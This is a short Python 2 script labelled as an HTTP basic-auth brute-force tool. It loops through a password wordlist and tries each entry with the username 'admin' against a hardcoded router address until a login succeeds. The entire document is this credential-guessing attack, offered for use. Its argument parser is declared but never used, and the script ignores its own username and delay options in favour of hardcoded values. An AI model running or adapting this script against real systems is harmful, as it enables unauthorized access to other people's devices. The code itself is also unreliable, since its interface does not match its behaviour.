from time import sleep
import httplib2
import sys
import argparse

parser = argparse.ArgumentParser(description='HTTP Auth Brute Force Tool')
parser.add_argument('Target', metavar='T', type=str, help='The target URI. ex http://192.168.1.1')
parser.add_argument('Wordlist', metavar='W', type=str, help='The wordlist to choose passwords from')
parser.add_argument('Username', metavar='U', type=str, help='The username to use')
parser.add_argument('Delay', metavar='D', type=int, help='Time in milliseconds between each request', default=5)

if not sys.argv[1:]:
    print "Please provide word list"
    exit()
if sys.argv[2:]:
    startAt = int(sys.argv[2])
count = 0
with open(sys.argv[1], "r") as f:
    pwd = f.readline().strip('\n')
    if 'startAt' in vars() or 'startAt' in globals():
        print "Skipping: " + str(startAt)
        while count <= startAt:
            pwd = f.readline().strip('\n')
            count += 1
    while pwd:
        print pwd
        http = httplib2.Http()
        http.add_credentials("admin", pwd)
        res, content = http.request("http://192.168.1.1")
        print res.status
        if (res.status == 200): exit()
        pwd = f.readline().strip('\n').strip('')
        while not pwd:
            pwd = f.readline().strip('\n')
        sleep(0.05)
